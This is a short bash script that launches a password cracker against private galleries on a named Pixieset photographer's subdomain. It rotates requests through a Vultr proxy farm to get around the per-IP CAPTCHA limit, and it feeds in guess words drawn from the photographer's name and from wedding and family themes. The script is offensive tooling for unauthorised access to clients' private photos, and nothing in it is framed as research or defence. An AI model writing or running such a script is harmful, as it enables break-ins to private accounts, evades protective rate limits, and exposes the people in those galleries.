#!/bin/bash
# Deploy & run Pixieset smart-password cracker via Vultr proxy farm
# CAPTCHA: 3 attempts per egress IP → 5 IPs = up to 15 smart guesses/gallery
set -euo pipefail
cd "$(dirname "$0")"

TARGET="${1:-sarahhillphotography15.pixieset.com}"
GALLERIES="${2:-jill}"
OUT="${3:-pixieset_results.json}"

if [ ! -f proxies.txt ]; then
  echo "[!] proxies.txt missing — deploy Vultr proxies first"
  exit 1
fi

echo "[*] Target:    $TARGET"
echo "[*] Galleries: $GALLERIES"
echo "[*] Proxies:"
cat proxies.txt
echo ""

python3 pixieset_cracker.py \
  -u "$TARGET" \
  -g "$GALLERIES" \
  --proxy --proxy-file proxies.txt \
  -e love,family,wedding,baby,photos,sarah,hill,sarahhill,client,guest \
  -d 2.5 -v \
  -o "$OUT"

echo ""
echo "[*] Results: $OUT"
python3 -m json.tool "$OUT" 2>/dev/null | head -80
